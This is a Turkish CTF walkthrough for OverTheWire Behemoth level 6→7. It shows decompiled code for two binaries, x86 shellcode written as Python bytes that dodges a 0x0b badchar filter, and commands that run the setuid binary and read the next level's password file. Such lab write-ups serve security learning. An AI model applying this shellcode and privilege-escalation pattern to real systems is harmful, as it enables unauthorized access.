# OverTheWire — Behemoth Level 6 → 7

> Hedef: `behemoth6`'dan `behemoth7` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: `behemoth6_reader` cwd'deki `shellcode.txt`'i **mmap RWX → çalıştırıyor**; çıktısı
> `strcmp` ile karşılaştırılıyor → "HelloKitty" yazdır → behemoth6 shell açar.

---

## 1. Bağlantı
```bash
ssh behemoth6@behemoth.labs.overthewire.org -p 2221
```

## 2. İki binary
```c
// behemoth6:
fp = popen("/behemoth/behemoth6_reader", "r");
fread(buf, 10, 1, fp);                       // reader çıktısının 10 byte'ı
if (strcmp(buf, "HelloKitty") == 0) {        // rodata @0x804a03c = "HelloKitty"
    puts("Correct.");
    setreuid(geteuid(), geteuid());          // euid = behemoth7
    execl("/bin/sh", "sh", NULL);            // SHELL as behemoth7
} else puts("Incorrect output.");

// behemoth6_reader:
fd = open("shellcode.txt", O_RDONLY);
mem = mmap(0, 0x1000, PROT_READ|WRITE|EXEC, MAP_PRIVATE, fd, 0);   // FILE'ı RWX map'le
for (i=0; i<0x1000; i++) if (mem[i] == 0x0b) { puts("..."); exit; }   // 0x0b YASAK!
((void(*)())mem)();                          // shellcode.txt'i ÇALIŞTIR
```

## 3. İki kritik nokta
1. **reader, behemoth6 olarak çalışır** (popen'in `sh`'i euid'i düşürür) → shellcode'u behemoth7
   yapamayız. Bunun yerine reader'ın **çıktısı** "HelloKitty" olmalı → `strcmp` tutar → **behemoth6**
   (euid=behemoth7) `execl` ile shell açar.
2. **0x0b baytı yasak:** reader, shellcode'da `0x0b` (= execve syscall no `mov al,0x0b`) bulursa
   çıkar. → execve gerekirse `mov al,0x0a; inc eax` (`b0 0a 40`) ile 0x0b'siz yap.

## 4. Exploit — shellcode.txt: stdout'a "HelloKitty" yaz
```python
sc = bytes([
 0x68,0x74,0x79,0x00,0x00, 0x68,0x6f,0x4b,0x69,0x74, 0x68,0x48,0x65,0x6c,0x6c, 0x89,0xe1,  # push "HelloKitty"; ecx=str
 0x31,0xc0,0x31,0xdb,0xb3,0x01,0xb0,0x04,0x31,0xd2,0xb2,0x0a,0xcd,0x80,   # write(1, str, 10)
 0x31,0xc0,0x31,0xdb,0xb0,0x01,0xcd,0x80])                                # exit(0)
assert 0x0b not in sc
# -> shellcode.txt; behemoth6'yı o cwd'den çalıştır; açılan shell'e komut besle (timed)
```
```bash
W=$(mktemp -d); cd "$W"; python3 -c '...' > shellcode.txt
python3 -c 'timed: "id; cat /etc/behemoth_pass/behemoth7"' | /behemoth/behemoth6
```
Çıktı: `Correct.` → `uid=13007(behemoth7)` → şifre.


## Dersler
| Konu | Not |
|------|-----|
| dosyadan shellcode exec | `mmap RWX(fd)` + `call mem` → dosya içeriği kod olur (null serbest, read ile) |
| privilege drop (popen) | `popen`'in `sh`'i euid≠ruid'de yetki düşürebilir → asıl suid süreç (behemoth6) shell açmalı |
| badchar filtresi | 0x0b taranıyor → `mov al,0x0a; inc eax` ile syscall no'yu dolaylı kur |
| strcmp kapısı | reader çıktısı = beklenen string → ana program ödülü verir |


